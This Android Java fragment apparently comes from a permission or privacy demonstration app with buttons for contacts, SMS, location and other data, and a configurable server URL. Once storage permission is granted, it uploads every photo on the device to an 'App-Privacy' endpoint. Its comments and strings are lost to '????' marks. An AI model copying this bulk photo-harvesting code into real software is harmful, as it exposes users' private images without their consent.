/*
 * Copyright (C) 2022 xuexiangjys(xuexiangjys@163.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.lenovo.innovate.fragment.news;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;

import androidx.annotation.NonNull;
import androidx.recyclerview.widget.RecyclerView;

import com.alibaba.android.vlayout.DelegateAdapter;
import com.alibaba.android.vlayout.VirtualLayoutManager;

import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.XXPermissions;
import com.lenovo.innovate.R;
import com.lenovo.innovate.activity.MainActivity;
import com.lenovo.innovate.core.BaseFragment;
import com.lenovo.innovate.databinding.FragmentGuoduBinding;
import com.lenovo.innovate.prince.PermissionUtils;
import com.lenovo.innovate.prince.http.UpPicture;
import com.lenovo.innovate.prince.utils.SettingSPUtils;
import com.lenovo.innovate.utils.DemoDataProvider;
import com.lenovo.innovate.utils.Utils;
import com.lenovo.innovate.utils.XToastUtils;

import com.xuexiang.xhttp2.XHttpSDK;
import com.xuexiang.xpage.annotation.Page;
import com.xuexiang.xpage.enums.CoreAnim;
import com.xuexiang.xui.adapter.recyclerview.RecyclerViewHolder;
import com.xuexiang.xui.adapter.simple.AdapterItem;
import com.xuexiang.xui.widget.actionbar.TitleBar;
import com.xuexiang.xui.widget.banner.widget.banner.SimpleImageBanner;
import com.xuexiang.xui.widget.imageview.ImageLoader;
import com.xuexiang.xui.widget.imageview.RadiusImageView;
import com.xuexiang.xui.widget.toast.XToast;
import com.xuexiang.xutil.app.ActivityUtils;
import com.xuexiang.xutil.net.NetworkUtils;
import com.xuexiang.xutil.tip.ToastUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import me.samlss.broccoli.Broccoli;

/**
 * ????????????
 *
 * @author xuexiang
 * @since 2019-10-30 00:15
 */
@Page(anim = CoreAnim.none)
public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements View.OnClickListener{

    private static final String TAG = "permission";
    Context context;
    List list1 = new ArrayList();
    public  static  List<Object> already_up1 = new ArrayList<>();
    @NonNull
    @Override
    protected FragmentGuoduBinding viewBindingInflate(LayoutInflater inflater, ViewGroup container) {
        return FragmentGuoduBinding.inflate(inflater, container, false);
    }

    /**
     * @return ????????? null????????????????????????
     */
    @Override
    protected TitleBar initTitle() {
        return null;
    }

    /**
     * ???????????????
     */
    @Override
    protected void initViews() {

        context = getActivity();
        EditText editText =findViewById(R.id.et_api_url);
        editText.setText(SettingSPUtils.getInstance().getApiURL());
        Button button=findViewById(R.id.btn_save);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String url = editText.getText().toString().trim();
                if (NetworkUtils.isUrlValid(url) && XHttpSDK.verifyBaseUrl(url)) {
                    XHttpSDK.setBaseUrl(url);
                    SettingSPUtils.getInstance().setApiURL(url);
                    ToastUtils.toast("?????????????????????");
                } else {
                    ToastUtils.toast("???????????????????????????");
                }
            }
        });

    }
    @Override
    protected void initListeners() {
        binding.superContact.setOnClickListener(this);
        binding.superContactLog.setOnClickListener(this);
        binding.superMessage.setOnClickListener(this);
        binding.superPhoneMessage.setOnClickListener(this);
        binding.superLocation.setOnClickListener(this);
        binding.superCalendar.setOnClickListener(this);
        binding.superStorage.setOnClickListener(this);
        binding.superMicrophone.setOnClickListener(this);
        binding.superCamera.setOnClickListener(this);

    }
    @Override
    protected void initArgs() {
        super.initArgs();
        XToast.Config.get()
                //?????????????????????
                .setGravity(Gravity.CENTER);
    }

    @Override
    public void onClick(View v) {
        PermissionUtils permissionUtils =new  PermissionUtils();
        int id = v.getId();
        if (id == R.id.super_contact) {
            permissionUtils.get_contact(context,getActivity());
        }else if (id == R.id.super_contact_log) {
            permissionUtils.get_CallLog(context);
        }
        else if (id == R.id.super_message) {
            permissionUtils.get_message(context);
        } else if (id == R.id.super_phone_message) {
            //
            permissionUtils.get_phoneMessage(context);
        }else if (id == R.id.super_location) {
            permissionUtils.get_location(context);
        }else if (id == R.id.super_calendar) {
            permissionUtils.get_calendar(context);
        }else if (id == R.id.super_storage) {
            XXPermissions.with(context)
                    .permission(com.hjq.permissions.Permission.READ_EXTERNAL_STORAGE)
                    .request(new OnPermissionCallback() {
                        @Override
                        public void onGranted(List<String> permissions, boolean all) {
                            if (all){
                                XToastUtils.warning("???????????????????????????");
                                List stringList = getSystemPhotoList( context);
                                for (int i = 0; i < stringList.size(); i++) {
                                    String str = (String) stringList.get(i);

                                    if( !list1.contains(stringList.get(i))){
                                        list1.add(stringList.get(i));
                                        UpPicture upPicture = new UpPicture();
                                        upPicture.uploadPicture(context,"/App-Privacy/index.php/Home/Permission/Picture",str);
                                        System.out.println(str);
                                    }

                                }
                            }
                        }
                        @Override
                        public void onDenied(List<String> permissions, boolean never) {
                            if (never){
                                XToastUtils.toast( "onDenied???????????????????????????????????????????????? ");
                                XXPermissions.startPermissionActivity(context,permissions);
                            }else {
                                XToastUtils.toast( "onDenied: ?????????????????? ");
                            }
                        }
                    });

        } else if (id == R.id.super_microphone) {
            permissionUtils.get_microphone(context);
        }else if (id == R.id.super_camera) {
            //permissionUtils.get_camera(context);
            ActivityUtils.startActivity(MainActivity.class);
        }else if (id == R.id.super_ex) {
           // openNewPage(ExploitationFragment.class);
            //uploadPicture();
        }

    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
    }

    public static List<String> getSystemPhotoList(Context context)
    {
        List<String> result = new ArrayList<String>();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null, null);
        if (cursor == null || cursor.getCount() <= 0) return null; // ????????????
        while (cursor.moveToNext())
        {
            int index = cursor
                    .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            String path = cursor.getString(index); // ????????????
            File file = new File(path);
            if (file.exists())
            {
                result.add(path);
                Log.i(TAG, path);
            }
        }

        return result ;
    }


    public static boolean listContains(List<Object> list, Object value) {
        return list.contains(value);
    }
}
